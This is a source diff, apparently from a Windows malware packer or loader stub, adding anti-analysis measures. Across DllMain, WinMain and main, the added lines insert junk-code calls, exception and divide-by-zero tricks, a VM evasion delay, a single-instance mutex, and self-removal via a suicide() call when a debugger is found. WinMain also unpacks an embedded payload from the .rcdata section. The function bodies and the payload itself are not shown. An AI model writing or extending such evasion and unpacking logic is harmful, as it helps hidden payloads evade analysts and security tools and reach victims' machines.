@@ -57,11 +57,31 @@ int __stdcall DllMain(_In_ HINSTANCE hInstance, _In_ DWORD fdwReason, _In_ LPVOI
 		//ret = Escape::escape();
 
 		ret = getapi();
+		
+		JunkCode();
+		ExceptionDetect();
+
+		JunkCode();
+		ret = DivideZero();
+
+		g_mutex_handle = bRunning(&ret);
+		if (g_mutex_handle) {
+			if (ret)
+			{
+				runLog("already running\r\n");
+				suicide();
+			}
+		}
+		else {
+			runLog("bRunning error\r\n");
+			return -1;
+		}
 
 #ifndef _DEBUG
 		if (Debug::isDebugged())
 		{
-			//return TRUE;
+			suicide();
+			return TRUE;
 		}
 #endif
 
@@ -87,12 +107,16 @@ int __stdcall WinMain(_In_ HINSTANCE hInstance, _In_opt_ HINSTANCE hPrevInstance
 
 	int ret = 0;
 
+	JunkCode();
+
+	//asmInt1Proc();
+
 	ret = VM::delay(VM_EVASION_DELAY);
 	if (ret < 0) {
 		return -1;
 	}
 	//VM::checkTickCount();
-
+	JunkCode();
 	ret = getapi();
 
 	//VM::checkSandbox();
@@ -111,11 +135,13 @@ int __stdcall WinMain(_In_ HINSTANCE hInstance, _In_opt_ HINSTANCE hPrevInstance
 	}
 
 #endif
-
+	JunkCode();
 	ExceptionDetect();
 
+	JunkCode();
 	ret = DivideZero();
 
+	JunkCode();
 	g_mutex_handle = bRunning(&ret);
 	if (g_mutex_handle) {
 		if (ret)
@@ -128,9 +154,8 @@ int __stdcall WinMain(_In_ HINSTANCE hInstance, _In_opt_ HINSTANCE hPrevInstance
 		runLog("bRunning error\r\n");
 		return -1;
 	}
-
-	runLog("starting\r\n");
-
+	
+	JunkCode();
 	if (Debug::isDebugged())
 	{
 		runLog("Debugged\r\n");
@@ -138,6 +163,7 @@ int __stdcall WinMain(_In_ HINSTANCE hInstance, _In_opt_ HINSTANCE hPrevInstance
 
 		return FALSE;
 	}
+	runLog("starting\r\n");
 	//Debug::attach();
 
 	ghThisHandle = (char*)hInstance;
@@ -148,11 +174,12 @@ int __stdcall WinMain(_In_ HINSTANCE hInstance, _In_opt_ HINSTANCE hPrevInstance
 	char secname[] = { '.','r','c','d','a','t','a',0 };
 
 	runLog("unshellSection entry\r\n");
-
+	JunkCode();
 	ret = Section::unshellSection((char*)hInstance, secname);
-
+	
 	runLog("unshellSection complete\r\n");
 
+	JunkCode();
 	ExitProcess(0);
 	return 0;
 }
@@ -164,10 +191,19 @@ int main(int argc, char** argv) {
 	//ret = Escape::escape();
 
 	ret = getapi();
+	ret = VM::delay(VM_EVASION_DELAY);
+
+	JunkCode();
+	ExceptionDetect();
+
+	JunkCode();
+	ret = DivideZero();
 
 #ifndef _DEBUG
 	if (Debug::isDebugged())
 	{
+		runLog("Debugged\r\n");
+		suicide();
 		return FALSE;
 	}
 #endif
